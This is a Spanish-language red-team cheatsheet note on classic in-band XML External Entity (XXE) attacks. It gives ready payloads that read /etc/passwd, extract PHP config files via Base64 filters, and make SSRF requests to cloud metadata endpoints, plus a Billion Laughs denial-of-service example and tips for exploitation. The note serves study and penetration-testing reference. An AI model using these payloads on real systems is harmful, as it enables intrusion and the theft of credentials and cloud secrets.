---
aliases: null
tags:
  - type/technique
  - vuln/xxe
  - technique/execution
  - asset/web-app
primary categories:
  - '[[Red Team]]'
secondary categories:
  - '[[Explotación]]'
tertiary categories:
  - '[[Web Explotación]]'
type: SubCheatSheet
linked:
  - '[[XML External Entity (XXE)]]'
---
# XXE - In-band Clásico

***

## Cheatsheet

|**Objetivo Estratégico**|**Descripción de la Técnica**|**Estructura del Payload**|
|---|---|---|
|**Extracción de Archivos Locales**|Utiliza el esquema `file://` o rutas absolutas para obligar al sistema a leer el contenido de un archivo local y devolverlo en el nodo XML reflejado.|`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>`|
|**Extracción con Wrappers (PHP)**|Cuando el archivo objetivo contiene caracteres (como `<` o `&`) que rompen el parser XML, empleo filtros de codificación para extraer el contenido en formato Base64.|`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=config.php"> ]><foo>&xxe;</foo>`|
|**SSRF (Server-Side Request Forgery)**|Aprovecho la capacidad del parser para realizar peticiones de red apuntando la entidad hacia la infraestructura interna o servicios de metadatos de la nube. Útil para [[Escaneo de Puertos Internos]].|`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]><foo>&xxe;</foo>`|
|**Denegación de Servicio (Billion Laughs)**|Declaro múltiples entidades anidadas que, al expandirse recursivamente, agotan la memoria del parser XML, provocando la caída del servicio u originando un cuello de botella computacional.|`<!DOCTYPE foo [ <!ENTITY a "lol"> <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"> ]><foo>&b;</foo>` _(Nota: requiere encadenamiento profundo en un entorno real)._|

^xxe-clasico-inband

## Consideraciones de Explotación

- **Resolución habilitada:** Para que cualquiera de estos payloads funcione, el componente que procesa el XML (como configuraciones por defecto en frameworks antiguos de Java o PHP) debe tener permitida la resolución de entidades externas.
- **Reflejo de datos:** La clave del ataque _in-band_ reside en identificar en qué nodo o atributo del documento XML se refleja la entrada del usuario. El llamado a la entidad (`&xxe;`) debe colocarse exactamente en ese nodo.
- **Limitaciones de caracteres:** Si el archivo extraído contiene formato XML válido o caracteres reservados, el parser intentará interpretarlo, lo que a menudo genera un error de sintaxis y arruina la extracción. El uso de wrappers (como `CDATA` dinámico o Base64) es mandatorio en estos casos.
- **Pivoteo táctico:** Si la inyección es exitosa pero la aplicación no devuelve el resultado en la respuesta (el servidor lo procesa pero no lo muestra), el enfoque _in-band_ deja de ser viable. En ese caso, la nota a vincular sería [[Blind XXE]] para forzar canales de exfiltración mediante [[XXE Out-of-Band (OOB)]].


---

## Overview

El ataque de [[XXE]] (XML External Entity) en su variante clásica o _in-band_ ocurre cuando una aplicación procesa un documento XML de forma insegura y devuelve el valor de la entidad externa procesada directamente dentro de la respuesta HTTP. Esto me permite confirmar y recuperar el resultado del payload de manera inmediata en la misma transacción.

***

## Notas Relacionadas


***
